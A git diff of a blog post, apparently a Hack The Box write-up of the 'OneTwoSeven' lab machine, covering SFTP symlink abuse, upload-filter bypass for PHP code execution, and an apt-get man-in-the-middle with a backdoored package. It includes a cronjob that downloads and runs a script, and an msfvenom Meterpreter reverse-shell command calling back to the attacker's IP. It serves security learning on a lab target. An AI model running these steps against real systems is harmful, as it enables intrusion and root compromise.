@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Onetwoseven - Hack The Box
-excerpt: "TBA"
-date: 2019-12-31
+excerpt: "OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. Once I get access to the administration page after port-forwarding my way in, I find the credentials for the admin user in a vim swap file then I have to work around the webapp addon manager filtering policies to upload a PHP file and get RCE. The priv esc was pretty fun and unique: I had to perform a MITM attack against apt-get and upload a malicious package that executes arbitrary code as root."
+date: 2019-08-31
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-onetwoseven/onetwoseven_logo.png
@@ -10,29 +10,35 @@ categories:
   - hackthebox
   - infosec
 tags:
-  -
+  - php
+  - apt
+  - mitm
+  - swapfile
+  - vim
+  - sftp
+  - ssh
+  - port forwarding
+  - sudo
+  - web
+  - linux
+  - symlink
 ---
 
 ![](/assets/images/htb-writeup-onetwoseven/onetwoseven_logo.png)
 
-TBA
+OneTwoSeven starts with enumeration of various files on the system by creating symlinks from the SFTP server. Once I get access to the administration page after port-forwarding my way in, I find the credentials for the admin user in a vim swap file then I have to work around the webapp addon manager filtering policies to upload a PHP file and get RCE. The priv esc was pretty fun and unique: I had to perform a MITM attack against apt-get and upload a malicious package that executes arbitrary code as root.
 
 ## Summary
 
-- Sign up page provides SFTP credentials to the box
+- The sign up webpage provides SFTP credentials to the box
 - From SFTP we can create a symlink to the root directory than access it with the browser and the home folder
 - A vim swap file reveals the `ots-admin` password for the local administration page
 - We can also retrieve the PHP source code of the main page via the symlink trick
-- The local admin page can only be access from localhost, we can do port-tunneling with SSH to connect to it
-- A file upload PHP web application can be accessed directly even if it's supposed to be disabled after encoding part of the URI
-- Uploading a PHP file provides RCE and a shell
+- The local admin page can only be accessed from localhost but we can do port-tunneling with SSH to connect to it
+- A file upload feature in a PHP web application can be accessed directly even if it's supposed to be disabled after encoding part of the URI
+- We get RCE by uploading a PHP file to the site
 - The `apt-get` update / upgrade command is in the sudoers file and runs as `root` without any password
-- We can craft a malicious updated package and force the server to use our box as a proxy to do a man-in-the-middle attack
-
-## Blogs/Tools used
-
-- https://versprite.com/blog/apt-mitm-package-injection/
-- Metasploit
+- We can craft a malicious package and force the server to use our box as a proxy to do a man-in-the-middle attack against apt
 
 ## Details
 
@@ -69,13 +75,13 @@ The website is some kind of hosting provider.
 
 ![](/assets/images/htb-writeup-onetwoseven/web3.png)
 
-At the bottom of the main page there's a hint about some kind of throttling being enforced on the system:
+At the bottom of the main page there's a hint about throttling enforced on the system:
 
 ![](/assets/images/htb-writeup-onetwoseven/donkeys.png)
 
-On the Attribution page, there's a note from the box creator confirming this: `Special thanks to 0xEA31 for the fail2ban configuration that already powered Lightweight and CTF.` So it's very likely that I don't need to run gobuster or any heavy enumeration on the main page.
+On the Attribution page, there's a note from the box creator confirming this: `Special thanks to 0xEA31 for the fail2ban configuration that already powered Lightweight and CTF.` Based on this information, I figure it's very likely that I don't need to run gobuster or do any heavy enumeration on the main page.
 
-If we click the sign up button, we get a personal account created automatically and see the credentials for SFTP.
+When I click the sign up button, I get a personal account created automatically and get the credentials for SFTP.
 
 ![](/assets/images/htb-writeup-onetwoseven/web4.png)
 
@@ -129,7 +135,7 @@ sftp> ls -l
 lrwxrwxrwx    1 1001     1001            1 Apr 22 01:07 root
 ```
 
-If I go in the `root` directory symlink I created, it returns me to the root of the SFTP however.
+If I go in the `root` directory symlink I created, it returns me to the root of the SFTP.
 
 ```
 sftp> cd root
@@ -141,7 +147,7 @@ But with the web browser however, when I browse to `root` I see a bunch of folde
 
 ![](/assets/images/htb-writeup-onetwoseven/symlink1.png)
 
-I can't go into `etc`, `home` or `usr` because I'm getting a `403 Forbidden` error message.
+I can't go into `etc`, `home` or `usr` because I get a `403 Forbidden` error message.
 
 But `/var/www` shows there's two main web directories: `html-admin` and `html`.
 
@@ -182,7 +188,7 @@ if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['passw
 
 ### Getting the user flag
 
-I can get the source of all the PHP files from the main website:
+I can get the source of all the PHP files from the main website by creating additional symlinks:
 
 ```
 sftp> ln -s /var/www/html/signup.php signup.txt
@@ -216,7 +222,7 @@ ots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false
 ots-4NzkzMDE:x:1001:1001:10.10.14.23:/home/web/ots-4NzkzMDE:/bin/false
 ```
 
-I have the source code of the signup page so I can find what the password is for this user:
+I have the source code of the signup page so I can find what the password is for this user. As shown previously, the password is a portion of the MD5 hash of the user IP address:
 
 ```
 php > echo "ots-" . substr(str_replace('=','',base64_encode(substr(md5("127.0.0.1"),0,8))),3);
@@ -246,7 +252,7 @@ Fetching /user.txt to user.txt
 
 ### Pivoting to the local administration page
 
-I can set up SSH tunneling to get access to 60080 on the server. But I need to pass the `-N` flag to SSH so it does try to spawn a shell.
+I'll use SSH tunneling to get access to port 60080 on the server. But I need to pass the `-N` flag to SSH so it does try to spawn a shell (because only SFTP is enabled).
 
 ```
 # ssh -L 60080:127.0.0.1:60080 -N ots-yODc2NGQ@10.10.10.133
@@ -257,7 +263,7 @@ I can now access the administration web page through my tunnel at `127.0.0.1:600
 
 ![](/assets/images/htb-writeup-onetwoseven/admin1.png)
 
-I can log in with `ots-admin` / `Homesweethome1`
+I log in with `ots-admin` / `Homesweethome1`
 
 ![](/assets/images/htb-writeup-onetwoseven/admin2.png)
 
@@ -265,7 +271,7 @@ Most of the menu items just provide the output of some Linux commands like:
 
 ![](/assets/images/htb-writeup-onetwoseven/admin3.png)
 
-The  OTS Addon Manager menu item does seem to contain some of hint:
+The OTS Addon Manager menu item contains some information about rewrite rules:
 
 ![](/assets/images/htb-writeup-onetwoseven/admin4.png)
 
@@ -273,7 +279,7 @@ The `addon-upload.php` and `addon-download.php` files are redirected to `addons/
 
 Each addon has a `[DL]` link right next to it and I can download the PHP source code of every file.
 
-I can download `ots-man-addon.php` by using specying the `addon` parameter manually.
+I can download `ots-man-addon.php` by using specifying the `addon` parameter manually.
 
 ![](/assets/images/htb-writeup-onetwoseven/admin5.png)
 
@@ -314,7 +320,7 @@ switch (true) {
 
 There's two gotchas however:
 - The URI needs to contain `/addon-upload.php` for the proper switch branch to be taken
-- `ots-man-addon.php` is not meant to be accessed directly from `/addons` but rather from `menu.php`. The ` if( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); }` code prevents the PHP code from executing if `/addons/` is in the URI.
+- `ots-man-addon.php` is not meant to be accessed directly from `/addons` but rather from `menu.php`. The `if( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); }` code prevents the PHP code from executing if `/addons/` is in the URI.
 
 I can bypass the first item by adding a bogus parameter like `?a=/addon-upload.php`, and the second by URL encoding some of the characters in the URI.
 
@@ -350,7 +356,7 @@ www-admin-data@onetwoseven:/var/www/html-admin/addons
 
 ### Priv esc using apt-get MITM
 
-I saw that `www-admin-data` can run `apt-get` update and upgrade as root without any password:
+I see that `www-admin-data` can run `apt-get` as root without any password:
 
 ```
 www-admin-data@onetwoseven:/$ sudo -l
@@ -363,7 +369,7 @@ User www-admin-data may run the following commands on onetwoseven:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
 ```
 
-The box is running Devuan Linux, a Linux distro for hipsters who don't like systemd. Interestingly, there's two different apt sources configured:
+The box is running Devuan Linux, a Linux distro for hipsters who don't like systemd. Interestingly, there are two different apt sources configured:
 
 ```
 www-admin-data@onetwoseven:/$ ls -l /etc/apt/sources.list.d
@@ -376,11 +382,11 @@ www-admin-data@onetwoseven:/$ cat /etc/apt/sources.list.d/onetwoseven.list
 deb http://packages.onetwoseven.htb/devuan ascii main
 ```
 
-That's probably a hint on what we need to do.
+It's pretty clear here that I need to do some kind of Man-In-The-Middle (MITM) attack on the apt upgrade process.
 
-I did some googling and found a nice blog explaining how to perform a Man-In-The-Middle (MITM) attack on apt-get: [https://versprite.com/blog/apt-mitm-package-injection/](https://versprite.com/blog/apt-mitm-package-injection/)
+I did some googling and found a nice blog explaining how to perform the MITM attack on apt-get: [https://versprite.com/blog/apt-mitm-package-injection/](https://versprite.com/blog/apt-mitm-package-injection/)
 
-I generated a backdoored package for nano: `nano_3.0.0_amd64.deb`
+I picked nano as my target for a malicious package: `nano_3.0.0_amd64.deb`
 
 The `postinst` adds a cronjob that executes `/bin/nano_backdoor` every 5 minutes:
 
@@ -460,13 +466,13 @@ Next I setup Burp to listen on all interfaces:
 
 ![](/assets/images/htb-writeup-onetwoseven/burp.png)
 
-Then modified `/etc/hosts` to point the apt repositories to my own box:
+Then modify `/etc/hosts` to point the apt repositories to my own box:
 
 ```
 127.0.0.1 packages.onetwoseven.htb de.deb.devuan.org
 ```
 
-I can force the server to connect through my Kali VM by setting the `http_proxy` variable so it uses the Burp proxy. The local host file points the repo domain to 127.0.0.1 so it proxies to my Python webserver.
+I can force the server to connect through my Kali VM by setting the `http_proxy` variable so it uses the Burp proxy. My local host file points the repo domain to 127.0.0.1 so it connects to my Python webserver.
 
 ```
 www-admin-data@onetwoseven:/$ sudo http_proxy=http://10.10.14.23:8080 apt-get update
@@ -544,13 +550,13 @@ chmod 777 /tmp/met
 /tmp/met
 ```
 
-Then generate a Metepreter payload to connect back to me once it gets executed by the cronjob:
+Then I generate a Meterpreter payload to connect back to me when it gets executed by the cronjob:
 
 ```
 # msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LPORT=5555 LHOST=10.10.14.23
 ```
 
-And finally once the cronjob runs, downloads `snowscan.sh`, executes it and downloads the meterpreter binary, I get a shell as root:
+And finally once the cronjob runs, it downloads `snowscan.sh`, executes it and downloads the meterpreter binary so I can get a shell as root:
 
 ```
 msf5 exploit(multi/handler) > show options
